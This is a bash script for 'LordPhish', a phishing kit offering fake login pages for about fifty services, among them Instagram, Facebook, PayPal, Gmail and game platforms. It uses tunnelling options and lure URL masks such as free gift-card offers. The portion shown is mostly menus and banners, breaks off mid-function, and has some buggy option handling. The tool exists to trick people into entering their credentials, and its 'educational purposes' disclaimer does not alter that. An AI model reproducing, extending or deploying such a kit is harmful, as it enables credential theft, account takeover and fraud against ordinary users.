#!/usr/bin/env bash
# Youtube Channel: Ch33ch_Sec
# Inspired by the linux choice shellphish
# Lordphish the best phishing tool!!!!
# Github: https://github.com/grenoxx
# Telegram: Ch33chOficial
# 68 Webpages !!!!!!

# Tunneling opitions:
# Serveo.net
# ngrok
# Localhost
# LocalHostRun

# Thanks for pages:
# Pages by: Gr3n0xX
# Pages by: Tahmid Rayat
# Pages by: A1S0N
# Pages by: Zeus
# Pages by: Darkmidius
# Pages by: AdvPhidhing devs

# MIT license

# Copyright (c) 2021 Gr3n0xX

# Permission is granted, free of charge, to anyone who obtains a copy
# of this software and associated documentation files (the "Software"), to handle
# in the Software without restriction, including without limitation the rights
# use, copy, modify, merge, publish, distribute, sublicense and / or sell
# copies of the Software and allow the persons to whom the Software is
# provided to do so, subject to the following conditions:

# The above copyright notice and permission notice must be included in all
# copies or substantial parts of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING, BUT NOT LIMITED TO, MERCHANTABILITY GUARANTEES,
# FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT WILL THE
# AUTHORS OR COPYRIGHT HOLDERS ARE RESPONSIBLE FOR ANY CLAIM, DAMAGE OR OTHERWISE
# LIABILITY, WHETHER IN ACTION OF CONTRACT, CRIME OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR WITH THE USE OR OTHER OFFERS OF THE SOFTWARE.
# IF THE SOFTWARE IS PUBLISHED ON GITHUB THE CREDITS OF THE SOFTWARE MAY BE IN THE FORM OF COMMENT, BANNER OR README.md!

red='\e[1;31m'
gren='\e[1;32m'
Y='\e[1;33m'
B='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
W='\e[1;37m'
P='\e[1;35m'
Green='\e[32m'
Gr='\e[5m\e[32m'
Gris='\e[90m'
r="\e[1;91m"
g="\e[1;92m"
y="\e[1;93m"
w="\e[1;39m"
c="\e[1;96m"
b="\e[1;94m"
o="\e[1;33m"
R="\033[1;31m"
G='\033[1;32m'
Y='\033[1;33m'
blue='\033[1;34m'
W='\033[1;37m'
Green='\033[32m'
Gren='\033[32m'
Gris='\033[90m'

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        if [[ -e webpages ]]; then
        rm -rf webpages
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
        sleep 2
        printf "\e[0m\n"
        printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44>"
        printf " \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;96m Visit github.com/grenoxx \e[0m"
        printf "\e[0m\n"
        exit 1

        else 
        printf "\e[0m\n"
        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
        sleep 2
        printf "\e[0m\n"
        printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44>"
        printf " \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;96m Visit github.com/grenoxx \e[0m"
        printf "\e[0m\n"
        exit 1
        fi
}              

smail_banner() {
printf "\n"
printf "${red}█░░ █▀█ █▀█ █▀▄ █▀█ █░█ █ █▀ █░█\n"
printf "${red}█▄▄ █▄█ █▀▄ █▄▀ █▀▀ █▀█ █ ▄█ █▀█\n"
printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.  \e[0m\n"
printf "\n"
printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by LordPhish.  ::\e[0m\n"
printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illegal!      ::\e[0m\n"
printf "\n"
    
}

UnzipFiles(){

command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;93m [!] Unzipping files ...!\e[0m\n"
sleep 1.9
nohup unzip sites.zip > /dev/null &

}
banner() {
clear
printf "\n"
echo -e "$blue
           . .IIIII             .II
  IIIIIII. I  II  .    II..IIIIIIIIIIIIIIIIIIII
 .  .IIIIII  II          III$cyan  Ch33ch$blue IIIIIIIIII.
    .IIIII.III I      IIIIIIIII$cyan Sec$blue IIIIIIIII  I
   .IIIIII$cyan Hacking$blue II  .IIII$cyan LordPhish$blue III. III
    IIIIIII$cyan  From$blue   ' IIIII I IIIIIIIIIIII III I
    .II$cyan     Linux OS$blue   IIIIIIIIIIII  IIIIIIIIII
       I.           .IIIIIIIIIIII   I   II  I
         .IIII        IIIIIIIIIIII     .       I
          IIIII.          IIIIII           . I.
         IIIIIIIII         IIIII             ..I  II .
          IIIIIII          IIII..             IIQII
            IIII           III. I            IIIEIII
            III             I                I  IPI
             II     $cyan  [-]$magenta Hacking$cyan [-]$blue        D   .
             I          $magenta The World$reset
             \n"
echo
echo
printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.  \e[0m\n"
printf "\n"
printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by LordPhish.  ::\e[0m\n"
printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illegal!      ::\e[0m\n"
printf "\n"
}


menu() {
clear
printf "\n"
echo -e $R"      ╔═══════════╗"
echo -e "$R    ╔═╝$W███████████$R╚═╗"
echo -e "$R   ╔╝$W███████████████$R╚╗"
echo -e "$R   ║$W█████\033[1;32mGr3n0xX \033[00m\033[1;37m████$R║"
echo -e "$R   ║$W█████████████████$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
echo -e "$R   ║$W█████████████████$R║            \e[30;48;5;196m\e[1;32m\e[1;36m Lord\e[0m \e[30;48;5;39m\e[1;31m Phish\e[0m\e[1;31m"
echo -e "$R   ║$W█$R╔$W█████████████$R╗$W█$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
echo -e "$R   ╚╦╝$W███$Gr▒▒\e[0m$W███$Gr▒▒\e[0m$W███$R╚╦╝    "
echo -e "$R   ╔╝$W██$Gr▒▒▒▒\e[0m$W███$Gr▒▒▒▒\e[0m$W██$R╚╗     "
echo -e "$R   ║$W██$Gr▒▒▒▒▒\e[0m$W███$Gr▒▒▒▒▒\e[0m$W██$R|      "
echo -e "$R   ║$W██$Gr▒▒▒▒\e[0m$W█████$Gr▒▒▒▒\e[0m$W██$R║                               "
echo -e "$R   ╚╗$W███████████████$R╔╝"
echo -e "$R  ╔═╬══╦╝$W██$Gr▒\e[0m$W█$Gr▒\e[0m$W██$R╚╦══╝ $G.$g▒$G.."
echo -e "$R  ║$W█$R║══║$W█████████$R║ $G...$g▒$G."
echo -e "$R  ║$W█$R║══║$W█$R║$W██$R║$W██$R║$W█$R║　$G.$g▒$G.."
echo -e "$R  ║$W█$R║══╚═╩══╩╦═╩═╩═╦╗$g▒$G."
echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
echo
printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.   \e[0m\n"
printf "\n"
printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;96m eBay   \e[0m          \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;96m Gmail   \e[0m   \n"  

printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;96m lol  \e[0m            \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;96m Tiktok  \e[0m      \n"

printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;96m Pinterest   \e[0m     \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;96m Whatsapp \e[0m  \n"

printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;96m CryptoCurrency\e[0m   \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;96m Starbucks \e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Github\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;96m Verizon   \e[0m       \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;96m Firmware \e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;96m Google\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;96m DropBox   \e[0m       \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;96m Gopro \e[0m   \n"

printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;96m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;96m Adobe ID   \e[0m      \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;96m apple\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;96m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;96m Shopify   \e[0m       \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;96m Bitcoin\e[0m  \n"

printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;96m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;96m Messenger  \e[0m      \e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;96m Ytsubs\e[0m     \n"

printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;96m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;96m GitLab   \e[0m        \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;96m Ofice-365\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;96m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;96m Twitch   \e[0m        \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;96m Playstation\e[0m  \n"

printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;96m MySpace   \e[0m       \e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;96m Amazon\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;96m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;96m Badoo   \e[0m         \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo Web\e[0m    \n"

printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;96m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;96m VK   \e[0m            \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;96m Pornhub\e[0m    \n"

printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m Yandex   \e[0m        \e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;96m Xvideos\e[0m     \n"

printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m DevianART   \e[0m     \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;96m Games Pages\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m Youtube\e[0m        \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;96m operadoras\e[0m \n"

printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram Group\e[0m \n"     

printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m           \e[1;92m[\e[0m\e[1;77mF\e[0m\e[1;92m]\e[0m\e[1;91m Follow me one Github\e[0m\n"

read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\e' menu_option

if [[ $menu_option == 1 || $menu_option == 01 ]]; then
instagram

elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
facebook

elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
server="snapchat"
start1

elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
server="twitter"
mask='unlimited-onedrive-space-for free'
start1

elif [[ $menu_option == 5 || $menu_option == 05 ]]; then
server="github"
mask='get-followers-one-github'
start1

elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
Google

elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
server="spotify"
start1

elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
server="netflix"
mask='get-blue-badge-on-twitter-free'
start1

elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
server="paypal"
start1

elif [[ $menu_option == 10 ]]; then
server="origin"
start1

elif [[ $menu_option == 11 ]]; then
server="steam"
mask='steam-500-usd-gift-card-free'
start1

elif [[ $menu_option == 12 ]]; then
server="yahoo"
start1

elif [[ $menu_option == 13 ]]; then
server="linkedin"
start1

elif [[ $menu_option == 14 ]]; then
server="protonmail"
start1

elif [[ $menu_option == 15 ]]; then
server="wordpress"
start1

elif [[ $menu_option == 16 ]]; then
microsoft
start1

elif [[ $menu_option == 17 ]]; then
server="youtube"
start1

elif [[ $menu_option == 18 ]]; then
server="ebay"
start1

elif [[ $menu_option == 19 ]]; then
lol

elif [[ $menu_option == 20 ]]; then
server="pinterest"
start1

elif [[ $menu_option == 21 ]]; then
server="cryptocurrency"
start1

elif [[ $menu_option == 22 ]]; then
server="verzion"
start1

elif [[ $menu_option == 23 ]]; then
server="dropbox"
start1

elif [[ $menu_option == 24 ]]; then
server="adobe"
start1

elif [[ $menu_option == 25 ]]; then
server="shopfy"
start1

elif [[ $menu_option == 26 ]]; then
server="messenger"
start1

elif [[ $menu_option == 27 ]]; then
server="gitlab"
start1

elif [[ $menu_option == 28 ]]; then
server="twitch"
start1

elif [[ $menu_option == 29 ]]; then
server="myspace"
start1

elif [[ $menu_option == 30 ]]; then
server="badoo"
start1

elif [[ $menu_option == 31 ]]; then
server="vk"
start1

elif [[ $menu_option == 32 ]]; then
server="yandex"
start1

elif [[ $menu_option == 33 ]]; then
server="devianart"
start1

elif [[ $menu_option == 34 ]]; then
server="stackoverflow"
start1

elif [[ $menu_option == 35 ]]; then
server="gmail"
start1

elif [[ $menu_option == 36 ]]; then
server="tiktok"
start1

elif [[ $menu_option == 37 ]]; then
server="whatsapp"
start1

elif [[ $menu_option == 38 ]]; then
server="starbucks"
start1

elif [[ $menu_option == 39 ]]; then
server="firmware"
start1

elif [[ $menu_option == 40 ]]; then
server="gopro"
start1

elif [[ $menu_option == 41 ]]; then
server="apple"
start1

elif [[ $menu_option == 42 ]]; then
server="bitcoin"
start1

elif [[ $menu_option == 43 ]]; then
server="ytsubs"
start1

elif [[ $menu_option == 44 ]]; then
microsoft_ofice


elif [[ $menu_option == 45 ]]; then
server="playstation"
mask='playstation-500-usd-gift-card-free'
start1

elif [[ $menu_option == 46 ]]; then
server="Amazon"
start1

elif [[ $menu_option == 47 ]]; then
server="yahoo_web"
start1

elif [[ $menu_option == 48 ]]; then
server="pornhub"
start1

elif [[ $menu_option == 49 ]]; then
server="xvideos"
start1

elif [[ $menu_option == 50 ]]; then
games

elif [[ $menu_option == 51 ]]; then
operadoras

elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

elif [[ $menu_option == 99 ]]; then
server="create"
createpage
start1

elif [[ $menu_option == Y ]]; then
banner
am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAqayme5ps560A

elif [[ $menu_option == T ]]; then 
banner
am start -a android.intent.action.VIEW https://t.me/Ch33chSec

elif [[ $menu_option == F ]]; then
banner
am start -a android.intent.action.VIEW https://github.com/grenoxx

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}



games() {
banner
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Call Of Duty\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Free Fire\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Free Fire Advanced\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m PUBG Mobile\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Clash Of Clans\e[0m\n"

printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' game

if [[ $game == 1 || $game == 01 ]]; then
server="codm"
start1

elif [[ $game == 2 || $game == 02 ]]; then
server="freefire"
start1

elif [[ $game == 3 || $game == 03 ]]; then
server="freefire2"
start1

elif [[ $game == 4 || $game == 04 ]]; then
server="pubg"
start1

elif [[ $game == 5 || $game == 05 ]]; then
server="coc"
start1

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
clear
menu
fi
}


lol(){
banner
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Create account Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m LOL New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m LOL Old login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' lol_option

if [[ $lol_option == 1 || $lol_option == 01 ]]; then
server="lol"
start1

elif [[ $lol_option == 2 || $lol_option == 02 ]]; then
server="createLOL"
start1

elif [[ $lol_option == 3 || $lol_option == 03 ]]; then
server="lol"
start1

elif [[ $lol_option == 4 || $lol_option == 04 ]]; then
server="lol"
start1

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
clear
menu
fi

}
operadoras () {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Claro Fake Page\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m TP-Link Fake Page\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
    

if [[ $op_menu == 1 || $op_menu == 01 ]]; then
server="claro"
start1
    

elif [[ $op_menu == 2 || $op_menu == 02 ]]; then
server"tplink"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

instagram(){
banner
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Copyright Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Mail Confirmation Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Copyright Infringement Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m IG Autoliker Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m IG Followers Page\e[0m\n"

printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' insta_option

if [[ $insta_option == 1 || $insta_option == 01 ]]; then
server="instagram"
start1

elif [[ $insta_option == 2 || $insta_option == 02 ]]; then
server="cpr"
start1

elif [[ $insta_option == 3 || $insta_option == 03 ]]; then
server="mcp"
start1

elif [[ $insta_option == 4 || $insta_option == 04 ]]; then
server="cip"
start1

elif [[ $insta_option == 5 || $insta_option == 05 ]]; then
server="igauth"
start1

elif [[ $insta_option == 5 || $insta_option == 05 ]]; then
server="instafollowers"
start1

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
clear
menu
fi

}

facebook(){
banner
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Create account\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Mobile Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Fake Statics Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Fake Messenger Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake Advanced Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake Lana Holes Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake Mia Khalifa Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Fake PUBG-lite Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option

if [[ $fb_option == 1 || $fb_option == 01 ]]; then
server="facebook"
start1

elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 6 || $fb_option == 06 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 7 || $fb_option == 07 ]]; then
server="face_deskStat"
start1

elif [[ $fb_option == 8 || $fb_option == 08 ]]; then
server="face_deskStat"
start1

else
printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
clear
menu
fi

}

Google() {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google to PC\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m Google Advanced pool\e[0m\n"
    
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' google_menu
    
if [[ $google_menu == 1 || $google_menu == 01 ]]; then
server="Google_pc"
start1
    
elif [[ $google_menu == 2 || $google_menu == 02 ]]; then
list_gm

elif [[ $google_menu == 3 || $google_menu == 03 ]]; then
server="advpool"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

list_gm() {
    banner
    
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google Mobile V2\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
if [[ $option == 1 || $option == 01 ]]; then
server="google_mobile"
start1
    
elif [[ $option == 2 || $option == 02 ]]; then
server="google_mobile"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

microsoft_ofice() {
    banner
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Excel\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m OneNote\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m PowerPoint\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m SharePoint\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Word\e[0m\n"
    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' ofice_menu
    
if [[ $ofice_menu == 1 ]]; then
server="exel"
start1

elif [[ $ofice_menu == 2 ]]; then
server="onenote"
start1

elif [[ $ofice_menu == 3 ]]; then
server="powerpoint"
start1

elif [[ $ofice_menu == 4 ]]; then
